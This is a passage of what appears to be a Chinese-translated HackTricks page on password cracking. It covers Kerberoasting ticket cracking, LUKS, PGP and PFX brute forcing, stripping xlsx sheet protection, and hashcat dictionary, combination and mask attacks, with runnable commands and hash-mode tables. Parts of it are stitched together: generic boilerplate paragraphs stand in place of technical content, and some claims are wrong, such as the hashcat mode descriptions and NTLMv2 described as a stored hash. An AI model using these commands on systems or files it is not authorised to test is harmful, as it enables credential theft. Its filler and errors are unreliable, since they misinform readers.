1. 首先，攻击者通过枚举AD环境中的服务账户来识别目标。这些服务账户通常用于运行各种服务和应用程序。

2. 一旦目标服务账户被识别出来，攻击者可以使用工具（如Mimikatz）来提取服务账户的Kerberos服务票据（Service Ticket）。

3. 接下来，攻击者可以离线破解这些服务票据，以获取服务账户的明文密码。攻击者可以使用字典攻击、暴力破解或其他密码破解技术来实现这一步骤。

4. 一旦明文密码被获取，攻击者就可以使用这些凭据来访问目标系统，获取敏感信息或进一步深入渗透AD环境。

为了防止Keberoasting攻击，以下措施可以采取：

- 强化服务账户的密码策略，确保使用强密码，并定期更换密码。

- 限制服务账户的权限，只授予其所需的最低权限。

- 定期审计和监控AD环境，及时发现并应对弱密码和异常活动。

- 使用多因素身份验证（MFA）来增加账户的安全性。

Keberoasting是一种有效的攻击技术，因此在保护AD环境中的服务账户时，需要采取适当的安全措施来防止此类攻击。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### LUKS 图像

#### 方法 1

安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 方法2

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found.

Brute force attacks can be time-consuming and resource-intensive, especially if the password is long and complex. However, they can be effective against weak passwords or poorly implemented security measures.

There are several tools available for conducting brute force attacks, such as Hydra and Medusa. These tools automate the process by attempting multiple login attempts in a short period of time.

To protect against brute force attacks, it is important to use strong, unique passwords and implement account lockout policies. Additionally, rate limiting and CAPTCHA can be used to prevent automated login attempts.

It is worth noting that brute force attacks are illegal and unethical unless conducted with proper authorization for legitimate security testing purposes. Always obtain permission before attempting any form of hacking or penetration testing.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
另一个Luks BF教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG私钥

Brute forcing a PGP/GPG private key involves systematically trying all possible combinations of characters until the correct key is found. This method is time-consuming and resource-intensive, but it can be effective if the key is weak or poorly chosen.

To perform a brute force attack on a PGP/GPG private key, you will need a powerful computer or a network of computers with significant computational power. You will also need software that can generate and test key combinations.

There are several tools available for brute forcing PGP/GPG private keys, such as John the Ripper and Hashcat. These tools use various techniques, such as dictionary attacks and pattern matching, to speed up the process.

When attempting to brute force a PGP/GPG private key, it is important to consider the complexity of the key. Longer and more complex keys will take significantly longer to crack. Additionally, if the key is properly generated and securely stored, brute forcing may be virtually impossible.

It is worth noting that brute forcing a PGP/GPG private key is illegal unless you have explicit permission from the key owner or are conducting a legitimate penetration test. Always ensure that you are acting within the boundaries of the law and ethical guidelines when performing any hacking activities.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI主密钥

使用[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)然后运行john

### Open Office密码保护的列

如果你有一个xlsx文件，其中有一列被密码保护，你可以取消保护：

* **将其上传到Google Drive**，密码将自动删除
* **手动删除**它：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX证书

PFX certificates, also known as PKCS#12 certificates, are a type of digital certificate that is used for secure communication and authentication. PFX certificates are commonly used in various applications, such as web servers, email clients, and VPNs.

PFX certificates are stored in a single file that contains both the public key and the corresponding private key. This file is typically password-protected to ensure the security of the private key.

To use a PFX certificate, you need to import it into the application or system that requires it. This can usually be done through the application's settings or configuration options.

Brute-forcing a PFX certificate involves attempting to guess the password used to protect the private key. This is typically done by trying a large number of possible passwords until the correct one is found.

There are various tools and techniques available for brute-forcing PFX certificates, including using wordlists, dictionary attacks, and custom scripts. It is important to note that brute-forcing a PFX certificate is a time-consuming process and may not always be successful.

It is also worth mentioning that brute-forcing a PFX certificate without proper authorization is illegal and unethical. It should only be done as part of a legitimate penetration testing or security assessment, with the proper authorization and consent.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具驱动的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 工具

**哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### 哈希标识符
```bash
hash-identifier
> <HASH>
```
### 字典列表

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **字典生成工具**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**：**高级键盘漫游生成器，可配置基本字符、键盘映射和路径。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John变异

阅读 _**/etc/john/john.conf**_ 并进行配置
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat攻击

* **字典攻击** (`-a 0`) 使用规则

**Hashcat**已经带有一个包含规则的**文件夹**，但你可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **字典组合**攻击

可以使用hashcat将两个字典组合成一个。\
如果列表1包含单词**"hello"**，而第二个列表包含两行单词**"world"**和**"earth"**。将生成单词`helloworld`和`helloearth`。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **掩码攻击** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 字典 + 掩码 (`-a 6`) / 掩码 + 字典 (`-a 7`) 攻击
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat模式

Hashcat是一款强大的密码破解工具，支持多种破解模式。以下是一些常用的Hashcat模式：

- **Straight**: 直接破解模式，适用于已知密码哈希值的情况。
- **Combination**: 组合破解模式，适用于已知密码部分字符的情况。
- **Brute-force**: 暴力破解模式，适用于未知密码的情况。
- **Hybrid**: 混合破解模式，结合了字典和暴力破解，适用于复杂密码的情况。
- **Mask**: 掩码破解模式，通过指定密码的部分字符和字符集合来破解密码。
- **Rule-based**: 基于规则的破解模式，通过应用密码变换规则来破解密码。

选择适合的破解模式可以提高密码破解的效率和成功率。根据具体情况选择合适的模式，并结合字典和规则进行破解，可以提高破解密码的成功率。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# 破解Linux哈希 - /etc/shadow文件

## 简介

在Linux系统中，用户的密码哈希值存储在`/etc/shadow`文件中。这个文件对于黑客来说是一个有价值的目标，因为它包含了用户账户的敏感信息。通过破解这些哈希值，黑客可以获取用户的密码，从而进一步入侵系统。

## 暴力破解

暴力破解是一种常见的破解哈希值的方法。它基于尝试所有可能的密码组合，直到找到与目标哈希值匹配的密码。以下是暴力破解Linux哈希的一般步骤：

1. 获取`/etc/shadow`文件：黑客需要获取目标系统的`/etc/shadow`文件，这可以通过各种方式实现，如通过远程访问或利用系统漏洞。

2. 提取哈希值：黑客需要从`/etc/shadow`文件中提取目标用户的哈希值。哈希值通常以用户名和哈希算法标识符的形式存储。

3. 构建密码字典：黑客需要创建一个密码字典，其中包含可能的密码组合。这可以是常见密码、字典攻击或自定义密码列表。

4. 应用暴力破解工具：黑客使用暴力破解工具，如John the Ripper或Hashcat，将密码字典中的每个密码与目标哈希值进行比较。如果找到匹配的密码，黑客就成功破解了哈希值。

5. 破解成功：一旦黑客找到与目标哈希值匹配的密码，他们就可以使用该密码来登录目标用户的账户。

## 防御措施

为了防止哈希值被暴力破解，系统管理员可以采取以下措施：

- 使用强密码策略：强制用户使用复杂的密码，包括大写字母、小写字母、数字和特殊字符。

- 使用盐值：在哈希算法中使用盐值可以增加哈希值的复杂性，使暴力破解更加困难。

- 使用适当的哈希算法：选择安全的哈希算法，如SHA-512，而不是易受攻击的算法，如MD5。

- 限制访问权限：确保只有授权用户可以访问`/etc/shadow`文件，以防止黑客获取哈希值。

- 监控异常活动：实施日志监控和入侵检测系统，以便及时发现和应对哈希破解尝试。

通过采取这些防御措施，系统管理员可以提高系统的安全性，防止黑客通过暴力破解获取用户密码。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# 破解Windows哈希

## 概述

在渗透测试中，破解Windows哈希是一项常见的任务。Windows操作系统使用哈希算法对用户密码进行加密存储。通过破解这些哈希，我们可以获取用户的明文密码，从而获得对系统的访问权限。

## 哈希类型

Windows操作系统使用不同的哈希算法来加密用户密码。以下是常见的Windows哈希类型：

- LAN Manager (LM) 哈希：这是Windows早期版本中使用的一种弱哈希算法。它将密码分为两个7个字符的部分，并对每个部分进行单独的哈希。由于其弱加密性，LM哈希易受到破解攻击。
- NT LAN Manager (NTLM) 哈希：这是Windows NT及更高版本中使用的一种更强大的哈希算法。NTLM哈希使用更复杂的算法，并且相对于LM哈希来说更难以破解。
- NT LAN Manager version 2 (NTLMv2) 哈希：这是Windows Vista及更高版本中使用的一种更安全的哈希算法。NTLMv2哈希使用更复杂的算法，并且相对于NTLM哈希来说更难以破解。

## 破解工具

有许多工具可用于破解Windows哈希。以下是一些常用的工具：

- Hashcat：这是一款功能强大的开源密码破解工具，支持多种哈希类型，包括Windows哈希。
- John the Ripper：这是另一款流行的密码破解工具，也支持多种哈希类型，包括Windows哈希。
- Cain and Abel：这是一款综合性的密码恢复工具，可以用于破解Windows哈希以及其他密码相关的任务。

## 破解策略

破解Windows哈希的策略通常包括以下步骤：

1. 收集哈希：首先，我们需要获取存储在目标系统中的Windows哈希。这可以通过从目标系统中提取哈希文件或通过网络抓取哈希传输数据包来完成。
2. 字典攻击：使用字典文件作为密码猜测的基础，尝试破解哈希。字典文件包含常见密码、常用词汇和其他可能的密码组合。
3. 暴力破解：如果字典攻击失败，我们可以使用暴力破解方法，尝试所有可能的密码组合。这是一种耗时的方法，但在某些情况下可能是有效的。
4. 彩虹表攻击：彩虹表是一种预先计算的哈希和明文密码对应关系的表格。通过使用彩虹表，我们可以快速查找哈希对应的明文密码。

## 结论

破解Windows哈希是渗透测试中的一项重要任务。了解不同的哈希类型、破解工具和策略可以帮助我们更好地进行密码破解，并获取对目标系统的访问权限。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to crack hashes. This method is effective against weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It involves trying all possible combinations of characters, including variations of dictionary words, to crack hashes. This method is effective against stronger passwords that are not easily guessable.

## Rainbow Tables

Rainbow tables are precomputed tables of hash values and their corresponding plaintext passwords. These tables can be used to quickly look up the plaintext password for a given hash, bypassing the need for brute force or dictionary attacks. However, rainbow tables can be large and require significant storage space.

## Password Cracking Tools

There are several password cracking tools available that automate the process of brute forcing application hashes. These tools often have built-in dictionaries and support for custom dictionaries, as well as options for hybrid attacks and the use of rainbow tables.

## Best Practices for Defending Against Brute Force Attacks

To defend against brute force attacks, it is important to enforce strong password policies that require users to choose complex passwords. Additionally, implementing account lockouts after a certain number of failed login attempts can help prevent brute force attacks. Monitoring and logging failed login attempts can also provide valuable information for detecting and mitigating brute force attacks.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
